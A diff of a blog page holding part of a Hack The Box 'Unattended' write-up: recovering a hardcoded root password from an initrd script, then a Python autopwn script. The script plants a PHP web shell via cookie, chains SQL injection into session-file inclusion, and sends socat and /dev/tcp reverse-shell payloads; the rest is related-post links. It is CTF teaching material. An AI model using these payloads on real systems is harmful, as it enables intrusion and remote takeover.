-scripts/local-top/cryptroot-305-                continue
-scripts/local-top/cryptroot-306-            fi
-...</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>grep -n3 -IR password
+<span class="go">...
+</span><span class="go">scripts/local-top/cryptroot-299-        if [ ! -e &#34;$NEWROOT&#34; ]; then
+</span><span class="go">scripts/local-top/cryptroot:300:      # guly: we have to deal with lukfs password sync when root changes her one
+</span><span class="go">scripts/local-top/cryptroot-301-      if ! crypttarget=&#34;$crypttarget&#34; cryptsource=&#34;$cryptsource&#34; \
+</span><span class="go">scripts/local-top/cryptroot-302-        /sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen ; then
+</span><span class="go">scripts/local-top/cryptroot:303:                message &#34;cryptsetup: cryptsetup failed, bad password or options?&#34;
+</span><span class="go">scripts/local-top/cryptroot-304-                sleep 3
+</span><span class="go">scripts/local-top/cryptroot-305-                continue
+</span><span class="go">scripts/local-top/cryptroot-306-            fi
+</span><span class="go">...
+</span></code></pre></div></div></p>
 
 <p>This &lsquo;/sbin/uinitrd c0m3s3f0ss34nt4n1&rsquo; looks promising&hellip;. Let&rsquo;s try it:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">guly@unattended:~/.test$ ./sbin/uinitrd c0m3s3f0ss34nt4n1
-132f93ab100671dcb263acaf5dc95d8260e8b7c6</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">guly@unattended:~/.test$ ./sbin/uinitrd c0m3s3f0ss34nt4n1
+</span><span class="go">132f93ab100671dcb263acaf5dc95d8260e8b7c6
+</span></code></pre></div></div></p>
 
 <p>The comment says &ldquo;# guly: we have to deal with lukfs password sync when root changes her one&rdquo;. Maybe this &lsquo;132f93ab100671dcb263acaf5dc95d8260e8b7c6&rsquo; is the root password. Let&rsquo;s try it:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">guly@unattended:~/.test$ su - root
-Password: 132f93ab100671dcb263acaf5dc95d8260e8b7c6
-
-root@unattended:~# cat /root/root.txt
-559c0**********************791d3</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">guly@unattended:~/.test$ su - root
+</span><span class="go">Password: 132f93ab100671dcb263acaf5dc95d8260e8b7c6
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">root@unattended:~# cat /root/root.txt
+</span><span class="go">559c0**********************791d3
+</span></code></pre></div></div></p>
 
 <p>Bingo! That&rsquo;s all folks! :o)</p>
 
@@ -794,7 +817,7 @@ root@unattended:~# cat /root/root.txt
 
 <p>Here is my <a href="https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/Unattended/autopwn_unattended.py" target="_blank">autopwn script</a>. It uses IPv6 by default (which is no blocked by the host-based firewall). But you can change it to use IPv4 (IPV6 = False). In this case you need to run it with sudo (or as root) in order to be able to bind the privileged ports (80 and 443).</p>
 
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python2</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python2</span>
 <span class="c1"># Author: Alamot (Antonios Tsolis)</span>
 <span class="kn">import</span> <span class="nn">re</span>
 <span class="kn">import</span> <span class="nn">json</span>
@@ -818,7 +841,7 @@ root@unattended:~# cat /root/root.txt
     <span class="k">return</span> <span class="n">addr</span>
     
 
-<span class="k">def</span> <span class="nf">get_ip_address</span><span class="p">(</span><span class="n">ifname</span><span class="p">,</span> <span class="n">ipv6</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
+<span class="k">def</span> <span class="nf">get_ip_address</span><span class="p">(</span><span class="n">ifname</span><span class="p">,</span> <span class="n">ipv6</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
     <span class="s1">&#39;&#39;&#39; Return the IP of an interface. &#39;&#39;&#39;</span>
     <span class="k">if</span> <span class="n">ipv6</span><span class="p">:</span>
         <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/proc/net/if_inet6&#34;</span> <span class="p">,</span> <span class="s2">&#34;rt&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
@@ -836,7 +859,7 @@ root@unattended:~# cat /root/root.txt
                                 <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;256s&#39;</span><span class="p">,</span> <span class="n">ifname</span><span class="p">[:</span><span class="mi">15</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">()))[</span><span class="mi">20</span><span class="p">:</span><span class="mi">24</span><span class="p">])</span>
 
 
-<span class="n">IPV6</span> <span class="o">=</span> <span class="bp">True</span>
+<span class="n">IPV6</span> <span class="o">=</span> <span class="kc">True</span>
 <span class="n">INTERFACE</span> <span class="o">=</span> <span class="s2">&#34;tun0&#34;</span>
 <span class="n">LHOST</span> <span class="o">=</span> <span class="n">get_ip_address</span><span class="p">(</span><span class="n">INTERFACE</span><span class="p">,</span> <span class="n">ipv6</span><span class="o">=</span><span class="n">IPV6</span><span class="p">)</span>
 <span class="k">if</span> <span class="n">IPV6</span><span class="p">:</span>
@@ -851,25 +874,25 @@ root@unattended:~# cat /root/root.txt
 <span class="k">def</span> <span class="nf">send_payload</span><span class="p">():</span>
     <span class="k">try</span><span class="p">:</span>
         <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
-        <span class="n">session</span><span class="o">.</span><span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span>
+        <span class="n">session</span><span class="o">.</span><span class="n">verify</span> <span class="o">=</span> <span class="kc">False</span>
         <span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="p">[</span><span class="s1">&#39;user_name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php passthru($_REQUEST[cmd])?&gt;&#39;</span>
         <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">RURL</span> <span class="o">+</span> <span class="s2">&#34;/index.php&#34;</span><span class="p">)</span>
         <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Injecting session via cookies: Status code &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">))</span>
         <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
-            <span class="nb">exit</span><span class="p">()</span>
+            <span class="n">exit</span><span class="p">()</span>
         <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Cookies: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get_dict</span><span class="p">()))</span>
         <span class="n">phpsessid</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get_dict</span><span class="p">()[</span><span class="s2">&#34;PHPSESSID&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
         <span class="k">if</span> <span class="ow">not</span> <span class="n">phpsessid</span><span class="p">:</span>
-            <span class="nb">exit</span><span class="p">()</span>
+            <span class="n">exit</span><span class="p">()</span>
         <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">RURL</span> <span class="o">+</span> <span class="s2">&#34;/index.php?id=587</span><span class="si">%27%</span><span class="s2">20UNION%20SELECT</span><span class="si">%20%</span><span class="s2">22about</span><span class="si">%27%</span><span class="s2">20UNION%20SELECT</span><span class="si">%20%</span><span class="s2">27</span><span class="si">%2f</span><span class="s2">var</span><span class="si">%2f</span><span class="s2">lib</span><span class="si">%2f</span><span class="s2">php</span><span class="si">%2f</span><span class="s2">sessions</span><span class="si">%2f</span><span class="s2">sess_&#34;</span> <span class="o">+</span> <span class="n">phpsessid</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="si">%27%</span><span class="s2">20LIMIT%201,1%20--</span><span class="si">%20%</span><span class="s2">22%20LIMIT%201,1%20--%20&amp;cmd=whoami&#34;</span><span class="p">)</span>
         <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;LFI via SQLI status code: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">))</span>
         <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
-            <span class="nb">exit</span><span class="p">()</span>
+            <span class="n">exit</span><span class="p">()</span>
         <span class="k">if</span> <span class="s2">&#34;www-data&#34;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
             <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Testing RCE: SUCCESS&#34;</span><span class="p">)</span>
         <span class="k">else</span><span class="p">:</span>
             <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s2">&#34;Testing RCE: FAILED&#34;</span><span class="p">)</span>
-            <span class="nb">exit</span><span class="p">()</span>
+            <span class="n">exit</span><span class="p">()</span>
             
         <span class="c1"># Alternative payloads (they work too)</span>
         <span class="c1"># Payload (url-encoded): bash -c &#39;bash -i &gt;&amp; /dev/tcp/LHOST/LPORT1 0&gt;&amp;1&#39; </span>
@@ -877,10 +900,10 @@ root@unattended:~# cat /root/root.txt
         
         <span class="k">if</span> <span class="n">IPV6</span><span class="p">:</span>
             <span class="c1"># Payload (url-encoded): socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp6:[LHOST]:LPORT1</span>
-            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">%73%</span><span class="s2">6f</span><span class="si">%63%</span><span class="s2">61</span><span class="si">%74%</span><span class="s2">20</span><span class="si">%65%</span><span class="s2">78</span><span class="si">%65%</span><span class="s2">63%3a</span><span class="si">%27%</span><span class="s2">62</span><span class="si">%61%</span><span class="s2">73</span><span class="si">%68%</span><span class="s2">20</span><span class="si">%2d%6c%69%</span><span class="s2">27</span><span class="si">%2c%70%</span><span class="s2">74</span><span class="si">%79%</span><span class="s2">2c</span><span class="si">%73%</span><span class="s2">74</span><span class="si">%64%</span><span class="s2">65</span><span class="si">%72%</span><span class="s2">72</span><span class="si">%2c%73%</span><span class="s2">65</span><span class="si">%74%</span><span class="s2">73</span><span class="si">%69%</span><span class="s2">64</span><span class="si">%2c%73%</span><span class="s2">69</span><span class="si">%67%</span><span class="s2">69</span><span class="si">%6e%74%</span><span class="s2">2c</span><span class="si">%73%</span><span class="s2">61</span><span class="si">%6e%65%</span><span class="s2">20</span><span class="si">%74%</span><span class="s2">63</span><span class="si">%706%</span><span class="s2">3a%5b&#34;</span> <span class="o">+</span> <span class="n">LHOST</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="si">%5d</span><span class="s2">%3a&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">LPORT1</span><span class="p">)</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">%73%</span><span class="s2">6f</span><span class="si">%63%</span><span class="s2">61</span><span class="si">%74%</span><span class="s2">20</span><span class="si">%65%</span><span class="s2">78</span><span class="si">%65%</span><span class="s2">63</span><span class="si">%3a%27%</span><span class="s2">62</span><span class="si">%61%</span><span class="s2">73</span><span class="si">%68%</span><span class="s2">20</span><span class="si">%2d%6c%69%</span><span class="s2">27</span><span class="si">%2c%70%</span><span class="s2">74</span><span class="si">%79%</span><span class="s2">2c</span><span class="si">%73%</span><span class="s2">74</span><span class="si">%64%</span><span class="s2">65</span><span class="si">%72%</span><span class="s2">72</span><span class="si">%2c%73%</span><span class="s2">65</span><span class="si">%74%</span><span class="s2">73</span><span class="si">%69%</span><span class="s2">64</span><span class="si">%2c%73%</span><span class="s2">69</span><span class="si">%67%</span><span class="s2">69</span><span class="si">%6e%74%</span><span class="s2">2c</span><span class="si">%73%</span><span class="s2">61</span><span class="si">%6e%65%</span><span class="s2">20</span><span class="si">%74%</span><span class="s2">63</span><span class="si">%706%</span><span class="s2">3a%5b&#34;</span> <span class="o">+</span> <span class="n">LHOST</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="si">%5d%3a</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">LPORT1</span><span class="p">)</span>
         <span class="k">else</span><span class="p">:</span>
             <span class="c1"># Payload (url-encoded): socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT1</span>
-            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">%73%</span><span class="s2">6f</span><span class="si">%63%</span><span class="s2">61</span><span class="si">%74%</span><span class="s2">20</span><span class="si">%65%</span><span class="s2">78</span><span class="si">%65%</span><span class="s2">63%3a</span><span class="si">%27%</span><span class="s2">62</span><span class="si">%61%</span><span class="s2">73</span><span class="si">%68%</span><span class="s2">20</span><span class="si">%2d%6c%69%</span><span class="s2">27</span><span class="si">%2c%70%</span><span class="s2">74</span><span class="si">%79%</span><span class="s2">2c</span><span class="si">%73%</span><span class="s2">74</span><span class="si">%64%</span><span class="s2">65</span><span class="si">%72%</span><span class="s2">72</span><span class="si">%2c%73%</span><span class="s2">65</span><span class="si">%74%</span><span class="s2">73</span><span class="si">%69%</span><span class="s2">64</span><span class="si">%2c%73%</span><span class="s2">69</span><span class="si">%67%</span><span class="s2">69</span><span class="si">%6e%74%</span><span class="s2">2c</span><span class="si">%73%</span><span class="s2">61</span><span class="si">%6e%65%</span><span class="s2">20</span><span class="si">%74%</span><span class="s2">63</span><span class="si">%70%</span><span class="s2">3a&#34;</span> <span class="o">+</span> <span class="n">LHOST</span> <span class="o">+</span> <span class="s2">&#34;%3a&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">LPORT1</span><span class="p">)</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">%73%</span><span class="s2">6f</span><span class="si">%63%</span><span class="s2">61</span><span class="si">%74%</span><span class="s2">20</span><span class="si">%65%</span><span class="s2">78</span><span class="si">%65%</span><span class="s2">63</span><span class="si">%3a%27%</span><span class="s2">62</span><span class="si">%61%</span><span class="s2">73</span><span class="si">%68%</span><span class="s2">20</span><span class="si">%2d%6c%69%</span><span class="s2">27</span><span class="si">%2c%70%</span><span class="s2">74</span><span class="si">%79%</span><span class="s2">2c</span><span class="si">%73%</span><span class="s2">74</span><span class="si">%64%</span><span class="s2">65</span><span class="si">%72%</span><span class="s2">72</span><span class="si">%2c%73%</span><span class="s2">65</span><span class="si">%74%</span><span class="s2">73</span><span class="si">%69%</span><span class="s2">64</span><span class="si">%2c%73%</span><span class="s2">69</span><span class="si">%67%</span><span class="s2">69</span><span class="si">%6e%74%</span><span class="s2">2c</span><span class="si">%73%</span><span class="s2">61</span><span class="si">%6e%65%</span><span class="s2">20</span><span class="si">%74%</span><span class="s2">63</span><span class="si">%70%</span><span class="s2">3a&#34;</span> <span class="o">+</span> <span class="n">LHOST</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="si">%3a</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">LPORT1</span><span class="p">)</span>
             
         <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">RURL</span> <span class="o">+</span> <span class="s2">&#34;/index.php?id=587</span><span class="si">%27%</span><span class="s2">20UNION%20SELECT</span><span class="si">%20%</span><span class="s2">22about</span><span class="si">%27%</span><span class="s2">20UNION%20SELECT</span><span class="si">%20%</span><span class="s2">27</span><span class="si">%2f</span><span class="s2">var</span><span class="si">%2f</span><span class="s2">lib</span><span class="si">%2f</span><span class="s2">php</span><span class="si">%2f</span><span class="s2">sessions</span><span class="si">%2f</span><span class="s2">sess_&#34;</span> <span class="o">+</span> <span class="n">phpsessid</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="si">%27%</span><span class="s2">20LIMIT%201,1%20--</span><span class="si">%20%</span><span class="s2">22%20LIMIT%201,1%20--%20&amp;cmd=&#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
     <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">RequestException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
@@ -893,14 +916,14 @@ root@unattended:~# cat /root/root.txt
 
 
 <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;LHOST: &#34;</span> <span class="o">+</span> <span class="n">LHOST</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">What shell do you want?&#34;</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;[1] www-data@unattended&#34;</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;[2] guly@unattended&#34;</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;[3] root@unattended&#34;</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;[4] Exit</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
-<span class="n">response</span> <span class="o">=</span> <span class="bp">None</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">What shell do you want?&#34;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[1] www-data@unattended&#34;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[2] guly@unattended&#34;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[3] root@unattended&#34;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[4] Exit</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">response</span> <span class="o">=</span> <span class="kc">None</span>
 <span class="k">while</span> <span class="n">response</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s2">&#34;1&#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">,</span> <span class="s2">&#34;4&#34;</span><span class="p">]:</span>
-    <span class="n">response</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s2">&#34;Please enter a number 1-4: &#34;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">raw_input</span><span class="p">(</span><span class="s2">&#34;Please enter a number 1-4: &#34;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
 <span class="k">if</span> <span class="n">response</span> <span class="o">==</span> <span class="s2">&#34;4&#34;</span><span class="p">:</span>
     <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
     
@@ -1012,33 +1035,17 @@ root@unattended:~# cat /root/root.txt
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Fulcrum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
+      <h3 class="title" lang="en">Falafel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">09 Jun 2018</time>
-      <time lang="el">09 Ιουν 2018</time>
+      <time lang="en">23 Jun 2018</time>
+      <time lang="el">23 Ιουν 2018</time>
     </footer>
   </a>
 </article>
@@ -1056,113 +1063,21 @@ root@unattended:~# cat /root/root.txt
            
            
            
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
+      <h3 class="title" lang="en">Nineveh write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">13 May 2018</time>
-      <time lang="el">13 Μαϊ 2018</time>
+      <time lang="en">17 Dec 2017</time>
+      <time lang="el">17 Δεκ 2017</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
            
           
            
@@ -1196,25 +1111,21 @@ root@unattended:~# cat /root/root.txt
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">27 Jul 2019</time>
+      <time lang="el">27 Ιουλ 2019</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -1251,6 +1162,238 @@ root@unattended:~# cat /root/root.txt
   </a>
 </article>
 
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Sense write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">24 Mar 2018</time>
+      <time lang="el">24 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Legacy write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1304,17 +1447,73 @@ root@unattended:~# cat /root/root.txt
            
            
            
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Falafel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
+      <h3 class="title" lang="en">Enterprise write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">23 Jun 2018</time>
-      <time lang="el">23 Ιουν 2018</time>
+      <time lang="en">19 Mar 2018</time>
+      <time lang="el">19 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fortune write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">02 Aug 2019</time>
+      <time lang="el">02 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fulcrum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Jun 2018</time>
+      <time lang="el">09 Ιουν 2018</time>
     </footer>
   </a>
 </article>
@@ -1348,77 +1547,21 @@ root@unattended:~# cat /root/root.txt
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 May 2018</time>
+      <time lang="el">13 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -1460,17 +1603,113 @@ root@unattended:~# cat /root/root.txt
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Fortune write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <h3 class="title" lang="en">Tally write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">02 Aug 2019</time>
-      <time lang="el">02 Αυγ 2019</time>
